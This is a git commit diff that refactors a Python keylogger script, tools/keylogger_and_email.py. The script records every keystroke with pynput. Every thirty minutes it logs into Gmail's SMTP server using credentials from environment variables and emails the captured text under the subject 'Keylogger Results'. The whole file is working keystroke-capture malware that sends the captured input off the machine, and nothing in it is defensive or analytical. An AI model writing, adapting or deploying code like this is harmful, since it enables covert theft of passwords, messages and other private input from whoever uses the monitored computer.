a97eed2bff257bd93308882d0644c78d84a87b87
Fraser Love <me@fraserlove.com>
2019-12-21 21:31:05 +0000

    modified:   tools/keylogger_and_email.py

--- tools/keylogger_and_email.py
+++ tools/keylogger_and_email.py
@@ -1,51 +1,55 @@
 from pynput.keyboard import Key, Listener
 import logging, smtplib, time, datetime, threading, os
+from email.message import EmailMessage
 from threading import Thread
 
-def func1():
-    global message
+entered = []
+
+def setup():
+    msg = EmailMessage()
     email = os.environ.get('EMAIL_NAME')
     password = os.environ.get('EMAIL_PASS')
-    send_to_email = os.environ.get('EMAIL_NAME')
-    message = []
-
-    session_exit = False
+    msg['From'] = os.environ.get('EMAIL_NAME')
+    msg['To'] = os.environ.get('EMAIL_NAME')
+    session = True
     email_time = datetime.datetime(1,1,1).now().time()
     email_no = 0
-    print('Setup Done')
+    return session, email_no, email_time, msg, email, password
 
-    while session_exit == False:
+def send_email(session, email_no, email_time, msg, email, password, entered):
+    while session == True:
         time_now = datetime.datetime(1,1,1).now().time()
         if time_now >= email_time:
             email_no += 1
-            server = smtplib.SMTP('smtp.gmail.com', 587)
-            server.starttls()
+            del msg['subject']
+            msg['Subject'] = 'Keylogger Results - Email No: {} Time: {}'.format(email_no, time_now)
+            msg.set_content(''.join(entered).replace("'", ''))
+            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
             server.login(email, password)
-            sending = 'Email No: {}\n\n{}'.format(email_no,''.join(message).replace("'", ''))
-            server.sendmail(email, send_to_email , sending)
+            server.sendmail(email, email, msg.as_string())
             server.quit()
             print('\n--------------------------EMAIL SENT----------------------------')
             print('Email No: {}'.format(email_no))
-            print('Message: {}'.format(sending))
+            print('Results: {}'.format(msg))
             print('--------------------------EMAIL SENT----------------------------\n')
-            message = []
+            entered = []
             email_time = (datetime.datetime(1,1,1).now() + datetime.timedelta(0,1800)).time()
 
-def func2():
+def key_listener():
     def on_press(key):
         if str(key) == 'Key.space':
             key = ' '
         elif str(key) == 'Key.backspace':
-            print('Backspace')
-            if len(message) > 0:
-                del message[-1]
+            if len(entered) > 0:
+                del entered[-1]
             key = ''
         if key != '':
-            message.append(str(key))
+            entered.append(str(key))
         print('Keydown: {}'.format(key))
     with Listener(on_press=on_press) as listener:
         listener.join()
 
 if __name__ == '__main__':
-    Thread(target = func1).start()
-    Thread(target = func2).start()
+    session, email_no, email_time, msg, email, password = setup()
+    Thread(target = send_email, args = (session, email_no, email_time, msg, email, password, entered)).start()
+    Thread(target = key_listener).start()
